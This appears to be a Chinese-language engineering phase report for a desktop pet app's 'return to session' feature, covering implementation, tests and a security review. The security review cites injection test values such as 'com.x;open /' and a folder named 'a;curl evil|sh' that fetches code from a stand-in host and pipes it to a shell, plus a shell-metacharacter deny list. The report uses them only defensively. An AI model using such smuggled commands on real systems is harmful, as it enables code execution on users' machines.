# 階段報告：Phase E 回到工作階段（Session jump-back）與「誰在等你」

> 分支 `feat/session-jump`，已 rebase 到 `main` @ 1122098（1.11.2）。版號尚未變更。

## 範圍

1. **所在 App 偵測**：Codex／Claude Code hook 與 OpenCode 插件在狀態事件附上 `host` 提示，只讀少數環境變數：`TERM_PROGRAM`、macOS `__CFBundleIdentifier`、`CLAUDE_CODE_ENTRYPOINT`，以及 `WT_SESSION`／`VSCODE_INJECTION`／`VSCODE_GIT_IPC_HANDLE`／`CURSOR_TRACE_ID` 是否存在（只送 `true`，不送值）。主行程正規化為 `{ kind, app }`（`app` 為固定清單中的短 id），不符者為 `unknown`。不傳 env 內容、pid、tty 或路徑。
2. **回到工作階段動作**（Sessions 列展開後、權限提醒泡泡、單一工作階段的等待權限／等待輸入通知點擊）：
   - **切換到 App**（macOS）：`execFile('/usr/bin/open', ['-b', bundleId])`，只會把 App 帶到最前面，不指定視窗或分頁（UI 提示文字已說明）。Windows 隱藏此動作，已記錄於 `docs/ux-overhaul/windows-todo.md`。
   - **顯示專案資料夾**：只對 realpath 後確實存在、且不是 App 套件的資料夾呼叫 `shell.showItemInFolder`（在 Finder／檔案總管中選取），絕不「開啟」它。
   - **複製專案路徑**：路徑不得含 shell 特殊字元與控制字元，並通過同樣的資料夾檢查後，由主行程寫入剪貼簿。
   - 設定 → 桌面 →「回到工作階段」：「顯示回到工作階段的動作」（預設開啟）與「切換到 App」（僅 macOS 顯示，預設開啟，主開關關閉時停用）。
3. **誰在等你**：同一工具家族有多個工作階段時，狀態列標出最需要處理的那一個並計數其他，例如 `Claude (CLI) · my-app Permission (+2)`；專案名稱依字元截斷為 24 字，且是獨立縮小的 flex 子元素，狀態與 `(+N)` 永遠不被截掉。排序：狀態優先度 → 等待中狀態取最近、工作中狀態取最早出現（`firstSeenAt`）→ session key，避免兩個工作中的 session 每次心跳就互換（多寵物圖也不會來回切換）。
4. zh-TW／en-US 文案、兩份 README、IPC 清單、project-map、Windows 待辦與 `audit-permission.md` 子任務已更新。

不在範圍：聚焦特定視窗／分頁（需要 AppleScript／輔助使用權限，刻意不做）、Windows 的切換、Codex Desktop 的 bundle id（未確認，暫不列入清單）。

## 實作摘要

| 區塊 | 檔案 | 內容 |
|---|---|---|
| App 清單 | `src/types/host-app.ts` | 17 個 App（Terminal、iTerm2、Warp、Ghostty、WezTerm、kitty、Alacritty、Hyper、Tabby、Windows Terminal、VS Code／Insiders、Cursor、Windsurf、Zed、JetBrains、Claude）與其允許的 bundle id；JetBrains 因 id 不唯一而沒有預設 bundle。 |
| 提示解析 | `electron/host-app.ts`、`electron/event-normalizer.ts` | 鍵名白名單（多出任何鍵即 `unknown`）、`TERM_PROGRAM` ≤32 字元、entrypoint ≤32、bundle id 為嚴格反向 DNS（標籤不得以 `-` 開頭、≤128 字元）且必須在清單內；查表用 `Map`，`__proto__`／`constructor` 不會命中。bundle id 優先（tmux 內、VS Code 分支），其次 Claude Desktop、`TERM_PROGRAM`、VS Code／Cursor 標記、Windows Terminal。事件只帶 `{ kind, app }`。 |
| Hook | `integrations/agent-hook.mjs`、`electron/setup.ts`（OpenCode 插件範本） | `hostHints()` 先在 hook 端做同樣的形狀檢查，只送有值的欄位；啟動時既有的腳本刷新會更新已安裝的 hook 與插件。 |
| 主行程服務 | `electron/session-jump.ts` | 每個工作階段在記憶體保存 `adapterId`、`app`、允許的 bundle id 與原始 cwd（最多 200 筆、45 分鐘過期、`offline` 即刪除，每個事件 O(1)）。`switchTarget` 只在 macOS、事件不是明確的 `generic-http` 且 bundle 可解析時回傳（清單才是真正的邊界，見安全審查）；`run()` 檢查兩個偏好、每個動作 10 秒 5 次的滑動視窗、再依動作驗證。`withSessionJumpContext` 在 ingress 把原始路徑與 bundle id 放進以事件物件為鍵的 `WeakMap`，並把 `host.switchable` 判定寫到事件上；送往 renderer 的事件不含兩者。 |
| Electron 連接 | `electron/main/session-jump-runtime.ts`、`electron/main/runtime.ts`、`electron/main.ts` | 注入 `shell.showItemInFolder`、`clipboard.writeText`、`fs.promises`；`normalizeIngressEvent` 包一層附加 context；`onEvent` 呼叫 `record()`；通知點擊 `openNotificationTarget()`：可切換則切換，否則照舊開啟 Sessions。 |
| IPC | `electron/ipc/session-jump.ts`、`channels.ts`、`preload.ts`、`src/types/electron-api.ts`、`src/types/session-jump.ts` | `session-jump`（invoke）：受信任的寵物或面板 main frame；payload 必須剛好 3 個鍵：`action`（三選一）、`source`（`ALL_SOURCES`）、`sessionId`（1–256）。renderer 無法傳入路徑或 bundle id。 |
| 通知 | `electron/notification-policy.ts`、`electron/desktop-notifications.ts` | 只有等待權限／等待輸入的候選通知帶 `session`；完成與錯誤通知（含合併）一律開啟 Sessions。 |
| 偏好 | `electron/desktop-preferences.ts`、`src/types/desktop.ts` | 新增布林值 `sessionJumpEnabled`、`sessionJumpSwitchAppEnabled`（預設 true），沿用既有的驗證、儲存與 projection。 |
| Store | `src/stores/agentStore.ts`、`src/utils/session-attention.ts` | `summarizeFamilies` 與 `mostUrgentSession` 一次走訪、不排序；`familyLines`、`highestPrioritySession`、`activeSessions` 不再依賴 `sessionList` 的完整排序，權限提醒只排序等待中的那幾筆。快照還原與事件都經 `sanitizeHost`。 |
| UI | `SessionRow.vue`、`PermissionNoticeBubble.vue`、`DesktopPet.vue/.css`、`SettingsDesktop.vue`、`StatusPanel.css`、`src/locales/{pet,panel}/*` | 共用 `Button`／`ToggleRow`；動作放在展開的明細裡（列本身仍是單一 disclosure 按鈕，不巢狀互動元素）；按鈕可換行；錯誤以 `role=status`／`alert` 顯示在地化文字。 |

### 效能

- 以前 `sessionList`（O(n log n) 排序）是寵物視窗的熱路徑：每批事件都會經 `activeSessions` → `familyLines` 觸發完整排序。現在寵物視窗只做 O(n) 單次走訪；完整排序只在面板讀取 `sessionList` 時計算（computed 為 lazy）。因為狀態優先度只有 8 個離散值且每次只需要每家族的第一名，單次走訪比優先度桶或 heap 更簡單，不需要增量結構。`tests/session-attention.test.mts` 以 20,000 筆驗證線性行為與決定性。
- 主行程每個事件多一次 `parseHostHints`（常數時間）與兩次 `Map` 操作；熱路徑沒有新增同步檔案 I/O 或資料庫寫入。檔案系統檢查只發生在使用者點擊時。

## 驗證證據

| 檢查 | 結果 |
|---|---|
| `pnpm install --frozen-lockfile` | 通過 |
| `pnpm exec vue-tsc --noEmit` | 通過 |
| `pnpm test:unit` | 1010／1010 通過（本階段新增 28 個：`host-app` 6、`session-jump` 13、`ipc-session-jump` 2、`session-attention` 5、hook host 1、通知目標 1；另擴充 desktop-preferences 與 OpenCode 插件斷言） |
| `pnpm lint` | 通過 |
| `pnpm exec vite build` | 通過 |
| `check:bundle-size`／`check:bundle` | 通過 |
| `check:contrast` | 通過（83 組） |
| `check:design:strict` | 通過，沒有新增 finding（`&nbsp;` 改為 CSS 間距） |
| `git diff --check` | 通過 |
| `docs/security/ipc-inventory.md` | rebase 後重新產生，107 個 handler |

測試全部使用暫存資料夾與注入的啟動器、資料夾開啟器與剪貼簿；沒有執行 `open`、沒有開啟 Finder、沒有讀取真實 home 或 Keychain。hook 測試會清除測試機本身的 `TERM_PROGRAM` 等變數。

**未做的驗證**：使用者的 Agent Pets 正在執行並占用 17373，且開發版啟動會刷新 `~/.desktop-pet` 內已安裝的 hook，因此本階段沒有啟動真實 Electron。狀態列、Sessions 列按鈕、權限提醒按鈕、設定開關、在 iTerm2／VS Code／Cursor／Claude Desktop 中實際切換、通知點擊，以及淺色／深色、減少透明度與高對比的外觀，需要在合併前於 macOS 實機確認。

## 安全審查

| 項目 | 結論 |
|---|---|
| 命令注入 | 固定執行檔 `/usr/bin/open`、參數陣列、`shell: false`、5 秒逾時。bundle id 在解析時、呼叫 `open` 前各驗證一次，且必須在清單內；標籤不得以 `-` 開頭，不能被當成 `open` 的選項（測試涵蓋 `-a Calculator`、`com.x;open /`）。 |
| 不需系統權限 | `open -b` 經 LaunchServices 啟動／啟用 App，不送 Apple Event，因此不觸發「自動化」或「輔助使用」TCC 提示；不使用 AppleScript／osascript。代價是只能啟用 App，無法指定視窗；App 未執行時會被啟動。 |
| 偽造 `/v1/events` | hook 與通用呼叫端共用同一個事件 token，adapter registry 只依 `source` 指派內建 adapter id，因此**無法**證明事件來自 hook：持有 token 的程式送 `source: claude` 就會得到 `switchable: true`。排除 `generic-http` 只是縱深防禦。真正的保證是：只能啟用固定清單中的終端機／IDE／Claude App，而且一定要使用者點擊（Sessions 按鈕、權限提醒按鈕，或等待權限／等待輸入通知）；不能指定任意 bundle id、不能開啟檔案或套件。 |
| 路徑濫用 | 只接受絕對路徑、≤4096 字元、無控制字元；Windows 拒絕 UNC／裝置路徑（避免連線遠端主機與 NTLM 憑證外洩）與 `name.{CLSID}`。`realpath` 解析所有連結後再檢查一次、`stat` 必須是資料夾；macOS 另拒絕 `.app`／`.pkg` 等套件與含 `Contents/Info.plist` 的資料夾。獨立審查發現 `shell.openPath` 對文件套件（`.xcodeproj`、`.rtfd`、`.photoslibrary`、第三方 UTI 等）會讓 LaunchServices 以對應 App 開啟攻擊者內容，因此改為 `shell.showItemInFolder`：只在檔案管理員中選取，從不開啟或啟動任何東西（測試涵蓋 `.xcodeproj`）。 |
| 剪貼簿 | 只在使用者點擊後寫入；路徑不得含 `;|&$\`<>(){}*?!"'` 與控制字元（POSIX 另拒絕 `\`，Windows 另拒絕 `%`、`^`），並須通過資料夾檢查。即使真的存在名為 `a;curl evil|sh` 的資料夾也不會被複製。 |
| Renderer 邊界 | renderer 只拿到 `{ kind, app, switchable }` 與專案顯示名稱；完整路徑與 bundle id 只在主行程記憶體，不寫入歷史、快照或磁碟。即使 renderer 被入侵，也只能對已知工作階段觸發三個有速率限制的動作。 |
| IPC | sender 驗證（寵物或面板 main frame）、執行期 payload 驗證（多餘鍵即拒絕）、每個動作獨立速率限制、新增 registrar 測試並更新清單。 |
| 預設值 | 兩個開關預設開啟：不需權限、只在使用者明確點擊後執行，且有效目標都受上述限制。 |

## 殘餘風險

- 未在真實 Electron 與實際終端機／IDE 中驗證（見上）。bundle id 清單依公開資訊建立，Cursor（`com.todesktop.230313mzl4w4u92`）、Windsurf、Tabby、Alacritty 等若改版變更 id，該 App 會退為無法切換，不會開錯 App。
- 在 tmux／screen 內，`__CFBundleIdentifier` 是 tmux server 啟動時的值；若從別的終端機重新 attach，可能切換到原本的 App。
- 從 SSH 連線執行的 agent 不會有 macOS bundle id；`TERM_PROGRAM` 若被轉送，可能切換到本機同名 App。
- 資料夾檢查與 `shell.showItemInFolder` 之間仍有極短的 TOCTOU 視窗；改為只選取後，即使被換成其他項目也不會啟動任何東西，最壞情況是在 Finder 中選取到別的項目。要利用它也必須能寫入專案的上層資料夾。
- 持有事件 token 的本機程式可以偽裝成內建 hook（見安全審查），因此能讓使用者點擊後啟用清單中的 App；這是刻意接受的限度。
- 含 shell 特殊字元（例如括號）的真實專案路徑無法複製，只能從展開的明細中手動選取。
- 舊版 hook（升級前已安裝、尚未刷新）不送 `host`，只會缺少「切換到 App」，資料夾與複製仍可用。
- Windows：切換動作未實作；資料夾與複製的路徑規則未在 Windows 實機驗證（已列入 `windows-todo.md`）。

## 版號建議

**Patch**（`main` 目前為 1.11.2，建議 1.11.3）。理由：新增的是有界、以使用者點擊觸發的功能，兩個新偏好是向下相容的布林值（無遷移），事件契約只新增選用欄位 `host`，沒有新的本機伺服器、權限邊界或持久化結構。若審查者把 hook 新增的 `host` 欄位視為公開 adapter 契約變更，可改為 minor。等待使用者確認後再更新版號。
